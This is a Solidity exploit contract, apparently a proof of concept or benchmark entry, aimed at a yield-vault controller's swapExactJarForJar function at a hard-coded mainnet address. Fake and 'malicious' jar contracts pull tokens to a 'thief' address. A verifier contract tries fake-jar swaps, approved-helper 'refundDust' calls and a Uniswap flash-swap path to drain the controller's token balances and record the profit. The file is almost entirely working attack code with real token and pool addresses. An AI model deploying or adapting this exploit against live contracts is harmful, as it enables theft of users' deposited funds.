pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IControllerV4Like {
    function swapExactJarForJar(
        address _fromJar,
        address _toJar,
        uint256 _fromJarAmount,
        uint256 _toJarMinAmount,
        address payable[] calldata _targets,
        bytes[] calldata _data
    ) external returns (uint256);

    function approvedJarConverters(address converter) external view returns (bool);
    function jars(address token) external view returns (address);
}

interface IJarLike is IERC20Like {
    function token() external view returns (address);
    function getRatio() external view returns (uint256);
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike is IERC20Like {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FakeJar is IJarLike {
    address public underlying;

    constructor() {
        underlying = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    }

    function setUnderlying(address newUnderlying) external {
        underlying = newUnderlying;
    }

    function token() external view returns (address) {
        return underlying;
    }

    function getRatio() external pure returns (uint256) {
        return 1e18;
    }

    function deposit(uint256) external {}

    function withdraw(uint256) external {}

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

contract MaliciousToJar is IJarLike {
    address public targetToken;
    address public thief;

    constructor() {
        targetToken = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        thief = msg.sender;
    }

    function setTargetToken(address newTargetToken) external {
        targetToken = newTargetToken;
    }

    function setThief(address newThief) external {
        thief = newThief;
    }

    function token() external view returns (address) {
        return targetToken;
    }

    function getRatio() external pure returns (uint256) {
        return 1e18;
    }

    function deposit(uint256 amount) external {
        if (amount == 0) {
            return;
        }

        (bool success, bytes memory data) = targetToken.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, msg.sender, thief, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");
    }

    function withdraw(uint256) external {}

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x6847259b2B3A4c17e7c43C54409810aF48bA5210;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address public constant RENBTC = 0xEB4C2781e4ebA804CE9a9803C67d0893436bB27D;
    address public constant THREECRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address public constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address public constant SNX = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
    address public constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address public constant CDAI = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
    address public constant CYFI = 0xFa3472f7319477c9bFEcdD66E4B948569E7621b9;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    IControllerV4Like internal constant CONTROLLER = IControllerV4Like(TARGET);
    IUniswapV2FactoryLike internal constant FACTORY = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY);

    FakeJar internal immutable FAKE_JAR;
    MaliciousToJar internal immutable MALICIOUS_TO_JAR;

    address internal _profitToken;
    uint256 internal _profitAmount;

    struct FlashswapPlan {
        address pair;
        address token;
        address jar;
        uint256 amount;
        bool active;
    }

    FlashswapPlan internal _flashswapPlan;

    constructor() {
        FAKE_JAR = new FakeJar();
        MALICIOUS_TO_JAR = new MaliciousToJar();
        MALICIOUS_TO_JAR.setThief(address(this));
    }

    function executeOnOpportunity() external {
        if (_profitAmount != 0) {
            return;
        }

        if (_attemptFakeJarPath()) {
            return;
        }

        if (_attemptHelperPath()) {
            return;
        }

        _attemptFlashswapPath();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        FlashswapPlan memory plan = _flashswapPlan;
        require(plan.active, "NO_PLAN");
        require(msg.sender == plan.pair, "BAD_PAIR");

        uint256 borrowed = amount0 != 0 ? amount0 : amount1;
        require(borrowed == plan.amount, "BAD_AMOUNT");

        if (!_safeApprove(plan.token, plan.jar, borrowed)) {
            _flashswapPlan.active = false;
            return;
        }

        try IJarLike(plan.jar).deposit(borrowed) {
            uint256 jarBal = _safeBalanceOf(plan.jar, address(this));
            if (jarBal == 0) {
                _flashswapPlan.active = false;
                return;
            }

            if (!_safeApprove(plan.jar, TARGET, jarBal)) {
                _flashswapPlan.active = false;
                return;
            }

            MALICIOUS_TO_JAR.setTargetToken(plan.token);
            address payable[] memory targets = new address payable[](0);
            bytes[] memory payloads = new bytes[](0);

            try CONTROLLER.swapExactJarForJar(plan.jar, address(MALICIOUS_TO_JAR), jarBal, 0, targets, payloads) returns (uint256) {
                uint256 repayment = borrowed + ((borrowed * 3) / 997) + 1;
                uint256 currentBalance = _safeBalanceOf(plan.token, address(this));
                if (currentBalance >= repayment) {
                    _safeTransfer(plan.token, plan.pair, repayment);
                    uint256 leftover = currentBalance - repayment;
                    if (leftover != 0) {
                        _profitToken = plan.token;
                        _profitAmount = leftover;
                    }
                }
            } catch {}
        } catch {}

        _flashswapPlan.active = false;
    }

    function _attemptFakeJarPath() internal returns (bool) {
        address[] memory candidates = _tokenCandidates();

        for (uint256 i = 0; i < candidates.length; i++) {
            address token = candidates[i];
            uint256 controllerBalance = _safeBalanceOf(token, TARGET);
            if (controllerBalance == 0) {
                continue;
            }

            uint256 beforeBalance = _safeBalanceOf(token, address(this));
            FAKE_JAR.setUnderlying(token);
            MALICIOUS_TO_JAR.setTargetToken(token);

            address payable[] memory targets = new address payable[](0);
            bytes[] memory data = new bytes[](0);

            try CONTROLLER.swapExactJarForJar(address(FAKE_JAR), address(MALICIOUS_TO_JAR), 0, 0, targets, data) returns (uint256) {
                uint256 gained = _safeBalanceOf(token, address(this)) - beforeBalance;
                if (gained != 0) {
                    _profitToken = token;
                    _profitAmount = gained;
                    return true;
                }
            } catch {}
        }

        return false;
    }

    function _attemptHelperPath() internal returns (bool) {
        address[] memory helpers = _helperCandidates();
        address[] memory pairs = _refundDustPairs();

        for (uint256 i = 0; i < helpers.length; i++) {
            address helper = helpers[i];
            if (!_isApprovedHelper(helper)) {
                continue;
            }

            for (uint256 j = 0; j < pairs.length; j++) {
                address pair = pairs[j];
                (address token0, address token1) = _safePairTokens(pair);
                if (token0 == address(0) || token1 == address(0)) {
                    continue;
                }

                uint256 before0 = _safeBalanceOf(token0, address(this));
                uint256 before1 = _safeBalanceOf(token1, address(this));
                if (_safeBalanceOf(token0, TARGET) == 0 && _safeBalanceOf(token1, TARGET) == 0) {
                    continue;
                }

                FAKE_JAR.setUnderlying(token0);
                address payable[] memory targets = new address payable[](1);
                bytes[] memory payloads = new bytes[](1);
                targets[0] = payable(helper);
                payloads[0] = abi.encodeWithSignature("refundDust(address,address)", pair, address(this));

                try CONTROLLER.swapExactJarForJar(address(FAKE_JAR), address(FAKE_JAR), 0, 0, targets, payloads) returns (uint256) {
                    uint256 gain0 = _safeBalanceOf(token0, address(this)) - before0;
                    if (gain0 != 0) {
                        _profitToken = token0;
                        _profitAmount = gain0;
                        return true;
                    }

                    uint256 gain1 = _safeBalanceOf(token1, address(this)) - before1;
                    if (gain1 != 0) {
                        _profitToken = token1;
                        _profitAmount = gain1;
                        return true;
                    }
                } catch {}
            }
        }

        return false;
    }

    function _attemptFlashswapPath() internal {
        address[] memory candidates = _flashswapCandidates();

        for (uint256 i = 0; i < candidates.length; i++) {
            if (_profitAmount != 0) {
                return;
            }

            address token = candidates[i];
            uint256 controllerBalance = _safeBalanceOf(token, TARGET);
            if (controllerBalance <= 1) {
                continue;
            }

            address jar = _safeJarForToken(token);
            if (jar == address(0) || jar.code.length == 0) {
                continue;
            }

            address pair = _safeGetPair(token, WETH);
            if (pair == address(0)) {
                continue;
            }

            (address token0, address token1) = _safePairTokens(pair);
            if (token0 == address(0) || token1 == address(0)) {
                continue;
            }

            (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
            uint256 reserve = token0 == token ? reserve0 : reserve1;
            if (reserve == 0) {
                continue;
            }

            uint256 amount = controllerBalance / 20;
            if (amount == 0) {
                amount = 1;
            }
            uint256 maxBorrow = reserve / 1000;
            if (maxBorrow == 0) {
                continue;
            }
            if (amount > maxBorrow) {
                amount = maxBorrow;
            }
            if (amount == 0) {
                continue;
            }

            _flashswapPlan = FlashswapPlan({
                pair: pair,
                token: token,
                jar: jar,
                amount: amount,
                active: true
            });

            try IUniswapV2PairLike(pair).swap(token0 == token ? amount : 0, token0 == token ? 0 : amount, address(this), bytes("pickle")) {
                if (_profitAmount != 0) {
                    return;
                }
            } catch {}

            _flashswapPlan.active = false;
        }
    }

    function _safeJarForToken(address token) internal view returns (address jar) {
        try CONTROLLER.jars(token) returns (address value) {
            jar = value;
        } catch {}
    }

    function _safeGetPair(address tokenA, address tokenB) internal view returns (address pair) {
        if (tokenA == address(0) || tokenB == address(0) || tokenA == tokenB) {
            return address(0);
        }
        if (tokenA.code.length == 0 || tokenB.code.length == 0) {
            return address(0);
        }

        try FACTORY.getPair(tokenA, tokenB) returns (address value) {
            pair = value;
        } catch {}
    }

    function _safePairTokens(address pair) internal view returns (address token0, address token1) {
        if (pair == address(0) || pair.code.length == 0) {
            return (address(0), address(0));
        }

        try IUniswapV2PairLike(pair).token0() returns (address value0) {
            token0 = value0;
        } catch {
            return (address(0), address(0));
        }

        try IUniswapV2PairLike(pair).token1() returns (address value1) {
            token1 = value1;
        } catch {
            return (address(0), address(0));
        }
    }

    function _isApprovedHelper(address helper) internal view returns (bool approved) {
        if (helper == address(0) || helper.code.length == 0) {
            return false;
        }

        try CONTROLLER.approvedJarConverters(helper) returns (bool value) {
            approved = value;
        } catch {}
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }

        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            amount = abi.decode(data, (uint256));
        }
    }

    function _safeApprove(address token, address spender, uint256 amount) internal returns (bool) {
        if (!_callOptionalBool(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0))) {
            return false;
        }
        return _callOptionalBool(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address recipient, uint256 amount) internal returns (bool) {
        return _callOptionalBool(token, abi.encodeWithSelector(IERC20Like.transfer.selector, recipient, amount));
    }

    function _callOptionalBool(address target, bytes memory callData) internal returns (bool) {
        if (target == address(0) || target.code.length == 0) {
            return false;
        }

        (bool success, bytes memory data) = target.call(callData);
        return success && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _helperCandidates() internal pure returns (address[] memory helpers) {
        helpers = new address[](4);
        helpers[0] = 0x7FBa4B8Dc5E7616e59622806932DBea72537A56b;
        helpers[1] = 0xCA35e32e7926b96A9988f61d510E038108d8068e;
        helpers[2] = 0xFCBa3E75865d2d561BE8D220616520c171F12851;
        helpers[3] = 0xC586BeF4a0992C495Cf22e1aeEE4E446CECDee0E;
    }

    function _refundDustPairs() internal pure returns (address[] memory pairs) {
        pairs = new address[](4);
        pairs[0] = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
        pairs[1] = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
        pairs[2] = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
        pairs[3] = 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940;
    }

    function _flashswapCandidates() internal pure returns (address[] memory tokens) {
        tokens = new address[](8);
        tokens[0] = DAI;
        tokens[1] = USDC;
        tokens[2] = USDT;
        tokens[3] = WBTC;
        tokens[4] = THREECRV;
        tokens[5] = SUSD;
        tokens[6] = RENBTC;
        tokens[7] = WETH;
    }

    function _tokenCandidates() internal pure returns (address[] memory tokens) {
        tokens = new address[](41);
        tokens[0] = 0x429881672B9AE42b8EbA0E26cD9C73711b891Ca5;
        tokens[1] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
        tokens[2] = DAI;
        tokens[3] = USDC;
        tokens[4] = USDT;
        tokens[5] = WETH;
        tokens[6] = WBTC;
        tokens[7] = SUSD;
        tokens[8] = THREECRV;
        tokens[9] = 0x49849C98ae39Fff122806C06791Fa73784FB3675;
        tokens[10] = 0xC25a3A3b969415c80451098fa907EC722572917F;
        tokens[11] = RENBTC;
        tokens[12] = CDAI;
        tokens[13] = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
        tokens[14] = COMP;
        tokens[15] = CRV;
        tokens[16] = SNX;
        tokens[17] = 0xa1484C3aa22a66C62b77E0AE78E15258bd0cB711;
        tokens[18] = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
        tokens[19] = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
        tokens[20] = 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940;
        tokens[21] = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
        tokens[22] = 0x6C3e4cb2E96B01F4b866965A91ed4437839A121a;
        tokens[23] = 0x2F50D538606Fa9EDD2B11E2446BEb18C9D5846bB;
        tokens[24] = 0x594a198048501A304267E63B3bAd0f0638da7628;
        tokens[25] = 0x5f3b5DfEb7B28CDbD7FAba78963EE202a494e2A2;
        tokens[26] = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
        tokens[27] = 0xA90996896660DEcC6E997655E065b23788857849;
        tokens[28] = 0xB1F2cdeC61db658F091671F5f199635aEF202CAC;
        tokens[29] = 0xd061D61a4d941c39E5453435B6345Dc261C2fcE0;
        tokens[30] = 0xd513d22422a3062Bd342Ae374b4b9c20E0a9a074;
        tokens[31] = 0xbFcF63294aD7105dEa65aA58F8AE5BE2D9d0952A;
        tokens[32] = 0xdc98556Ce24f007A5eF6dC1CE96322d65832A819;
        tokens[33] = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
        tokens[34] = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
        tokens[35] = 0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85;
        tokens[36] = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
        tokens[37] = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
        tokens[38] = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
        tokens[39] = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
        tokens[40] = CYFI;
    }
}
